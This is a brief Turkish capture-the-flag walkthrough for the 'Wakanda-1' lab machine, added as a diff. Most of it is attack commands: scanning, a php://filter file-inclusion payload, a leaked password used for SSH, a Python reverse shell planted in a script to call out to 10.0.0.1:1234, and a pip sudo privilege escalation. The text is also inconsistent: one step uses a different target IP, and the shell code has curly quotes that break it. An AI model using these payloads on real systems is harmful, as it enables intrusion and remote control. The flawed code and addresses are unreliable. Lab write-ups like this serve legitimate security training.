@@ -1,0 +1,18 @@
+WAKANDA-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.42 bulundu.
+2 - nmap -sT -A 192.168.2.42
+3 - gobuster dir -u http://192.168.2.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.42/?lang=fr
+5 - curl http://10.0.2.6/?lang=php://filter/convert.base64-encode/resource=index | base64 -d
+6 - $password = "Niamey4Ever227!!!", mamadou:Niamey4Ever227!!!
+7 - ssh -p 3333 mamadou@192.168.2.42
+8 - import pty, pty.spawn("/bin/bash")
+9 - nano /srv/.antivirus.py
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((“10.0.0.1”,1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([“/bin/sh”,”-i”])
+10 - https://gtfobins.github.io/gtfobins/pip/#sudo, whoami
